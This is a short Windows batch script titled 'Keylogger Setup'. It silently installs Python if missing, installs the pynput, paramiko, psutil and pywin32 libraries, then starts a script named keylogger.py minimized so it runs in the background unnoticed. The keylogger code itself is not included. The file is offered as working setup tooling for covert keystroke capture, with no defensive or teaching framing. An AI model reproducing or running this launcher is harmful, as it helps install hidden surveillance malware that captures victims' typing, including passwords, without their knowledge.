@echo off
title Keylogger Setup
echo Checking Python installation...

:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Downloading Python...
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = 'TLS12'; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.10/python-3.9.10-amd64.exe' -OutFile 'python_installer.exe'}"
    echo Installing Python...
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
)

:: Ensure pip is up to date
python -m ensurepip
python -m pip install --upgrade pip

:: Install required Python libraries
echo Installing required Python modules...
python -m pip install paramiko pynput psutil pywin32

:: Run the keylogger script
echo Starting keylogger...
start /min python keylogger.py

echo Keylogger is now running in the background.
exit
